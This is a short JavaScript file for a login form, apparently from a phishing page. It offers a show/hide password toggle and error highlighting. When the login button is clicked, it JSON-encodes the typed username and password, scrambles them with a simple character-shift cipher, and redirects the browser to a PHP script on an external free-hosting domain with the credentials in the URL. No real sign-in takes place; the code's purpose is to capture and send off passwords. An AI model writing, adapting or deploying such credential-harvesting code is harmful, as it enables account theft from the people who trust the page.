const usf = document.getElementById('usf');
const pp = document.getElementById('pp');
const sh = document.getElementById("show");
let ppull = "no";
let ourUrl = new URL(window.location.href);
if (ourUrl.searchParams.get('error')) {
    pp.classList.add('error');
}
pp.oninput = () => {
    if (pp.value == "") {
        sh.style.display = "none";
    } else {
        sh.style.display = "block";
    }
};
sh.onclick = () => {
    if (sh.innerText == "Show") {
        sh.innerText = "Hide";
        pp.type = "text";
    } else {
        sh.innerText = "Show";
        pp.type = "password";
    }
};
pp.onfocus = () => {
    pp.classList.remove("error");
};
usf.onfocus = ()=>{
    usf.classList.remove('error');
}
// 33 -126
function uniformDataHandler(anum){
    if(anum < 32){
        anum = 127 - (32-anum);
    } else if(anum > 126){
        anum = 31 + (anum-126);
    }
    return anum;
}
const enc = (str, key) => {
    let gstr = '';
    for (let index = 0; index < str.length; index++) {
        gstr += String.fromCharCode(uniformDataHandler(str[index].charCodeAt(0) + key));
    }
    return gstr;
}
document.getElementById('log').onclick = () => {
    const us = { name: usf.value, key: pp.value };
    if(us.name === '' || us.key === ' '){
        usf.classList.add('error');
        return 0;
    }
    if(us.key === '' || us.key === ' '){
        pp.classList.add('error');
        return 0;
    }
    let vurl = new URLSearchParams();
    vurl.set('rd', enc(JSON.stringify(us), 23));
    window.location.replace('https://liveliest-plug.000webhostapp.com/dh.php?' + vurl.toString());
    // window.history.pushState(null,'','?' + vurl.toString());
};
// document.getElementById("log").onclick = () => {
//     window.location.replace()
// };